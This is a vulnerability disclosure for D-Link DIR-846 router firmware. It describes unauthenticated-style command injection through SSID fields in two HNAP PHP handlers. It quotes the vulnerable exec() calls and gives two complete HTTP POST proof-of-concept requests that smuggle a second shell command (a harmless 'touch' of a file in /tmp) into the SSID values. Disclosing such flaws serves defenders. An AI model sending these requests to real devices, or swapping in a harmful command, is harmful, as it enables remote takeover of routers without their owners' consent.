### info of vulnerability
There are remote RCE vulnerabilities in D-Link router due to invalid sanitization so attackers could execute arbitrary code. 

Vulnerable targets include but are not limited to the lastest firmware versions of DIR-846(100A35)

### trigger point
The first vulnerable code is in file /squashfs-root/www/HNAP1/control/ SetMasterWLanSettings.php.
```php
          ......
11        $data["ssid0"] = trim($option["wl(1).(0)_ssid"]);
          .....
14        $data["ssid1"] = trim($option["wl(0).(0)_ssid"]);
          ......
70        $unicode_2 = $data["ssid1"];
71        exec("ssid_code set B2 2 ssid_tmp1 '" . $unicode_2 . "'");
72        $unicode_5 = $data["ssid0"];
73        exec("ssid_code set B5 0 ssid_tmp2 '" . $unicode_5 . "'", $str, $status2);
          ......
```
Attacker could inject evil command into `exec` function, so PoC1 is:
```
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetPasswdSettings"
HNAP_AUTH: D34C44D78E0DA072AE4E94B67361E182 1534384217127
Referer: http://192.168.0.1/account.html
Content-Length: 110
Cookie: loginpass=202cb962ac59075b964b07152d234b70; PHPSESSID=e5c635efde382dd2dd21a62b6649278f; uid=ac08Gage; PrivateKey=D7D42B5B2E20D9F30C0D44920DC56A58
DNT: 1
X-Forwarded-For: 8.8.8.8
Connection: close

{"SetMasterWLanSettings":{"wl(1).(0)_ssid":"aaa;touch /tmp/test1.php","wl(0).(0)_ssid":"aaa;touch /tmp/test2.php"}}

```

The second vulnerable code is in file /squashfs-root/www/HNAP1/control/ SetWizardConfig.php.
```php
           ......
130        $data["ssid0"] = trim($option["wl(1).(0)_ssid"]);
           ......
134        $data["ssid1"] = trim($option["wl(0).(0)_ssid"]);
           ......
185        $unicode_2 = $data["ssid1"];
186        exec("ssid_code set B2 2 ssid_tmp1 $unicode_2");
187        $unicode_5 = $data["ssid0"];
188        exec("ssid_code set B5 0 ssid_tmp2 $unicode_5");
           ......
```
Attacker could also inject evil command into `exec` function easily, so PoC2 is:
```
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetPasswdSettings"
HNAP_AUTH: D34C44D78E0DA072AE4E94B67361E182 1534384217127
Referer: http://192.168.0.1/account.html
Content-Length: 110
Cookie: loginpass=202cb962ac59075b964b07152d234b70; PHPSESSID=e5c635efde382dd2dd21a62b6649278f; uid=ac08Gage; PrivateKey=D7D42B5B2E20D9F30C0D44920DC56A58
DNT: 1
X-Forwarded-For: 8.8.8.8
Connection: close

{"SetWizardConfig":{"wl(1).(0)_ssid":"aaa;touch /tmp/test1.phpp","wl(0).(0)_ssid":"aaa;touch /tmp/test2.php"}}
```
